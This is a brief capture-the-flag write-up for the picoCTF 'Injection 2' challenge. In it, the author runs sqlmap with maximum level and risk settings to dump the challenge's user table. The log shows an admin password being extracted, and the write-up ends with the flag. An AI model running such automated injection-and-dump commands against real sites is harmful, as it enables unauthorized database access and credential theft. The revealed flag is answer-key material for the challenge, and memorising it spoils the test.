#Injection 2 - 110

For this problem, I fired up sqlmap (https://github.com/sqlmapproject) an automated SQL injection and database takeover tool. Using the followin command to find a vulnerability and enumerate the databse:
```
./sqlmap.py -u http://web2014.picoctf.com/injection2/ --forms --level=5 --risk=3 --batch --dump
```

Gave me the following infromation:

```
[14:05:01] [INFO] adjusting time delay to 1 second due to good response times
sql2
[14:05:14] [INFO] fetching tables for database: 'sql2'
[14:05:14] [INFO] fetching number of tables for database 'sql2'
[14:05:14] [INFO] retrieved: 1
[14:05:16] [INFO] retrieved: users
[14:05:37] [INFO] fetching columns for table 'users' in database 'sql2'
[14:05:37] [INFO] retrieved: 5
[14:05:40] [INFO] retrieved: id
[14:05:48] [INFO] retrieved: us
[14:06:45] [INFO] retrieved: password
[14:07:57] [INFO] retrieved: display_name
[14:09:36] [INFO] retrieved: user_level
[14:11:18] [INFO] fetching entries for table 'users' in database 'sql2'
[14:11:18] [INFO] fetching number of entries for table 'users' in database 'sql2'
[14:11:18] [INFO] retrieved: 1
[14:11:21] [INFO] retrieved: Admin
[14:12:14] [INFO] retrieved: 1
[14:12:21] [INFO] retrieved: super_secret_admin_pass
```

Logging in with the password revealed:

```
Logged in!

User level: 1337
Your flag is: flag_nJZAKGWYt7YfzmTsCV
```